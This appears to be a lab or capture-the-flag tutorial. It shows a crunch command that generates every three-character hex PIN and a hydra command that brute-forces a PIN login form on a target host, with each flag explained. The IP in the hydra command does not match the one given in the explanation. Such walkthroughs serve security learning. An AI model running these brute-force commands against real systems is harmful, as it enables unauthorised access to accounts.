## Generating the Password List

Crunch is a tool that generates a list of all possible password combinations based on given criteria.

```bash
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```

- `3` the first number is the minimum length of the generated password
- `3` the second number is the maximum length of the generated password
- `0123456789ABCDEF` is the character set to use to generate the passwords
- `-o 3digits.txt` saves the output to the 3digits.txt file

## Using the Password List

We can use hydra to test every possible password that can be put into the system```

```bash
hydra -l '' -P 3digits.txt -f -v 10.10.10.10 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

- `-l ''` indicates that the login name is blank as the security lock only requires a password
- `-P 3digits.txt` specifies the password file to use
- `-f` stops Hydra after finding a working password
- `-v` provides verbose output and is helpful for catching errors
- `10.10.110.157` is the IP address of the target
- `http-post-form` specifies the HTTP method to use
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by :
	- `/login.php` is the page where the PIN code is submitted
	- `pin=^PASS^` will replace ^PASS^ with values from the password list
	- `Access denied` indicates that invalid passwords will lead to a page that contains the text “Access denied”
	- `-s 8000` indicates the port number on the target
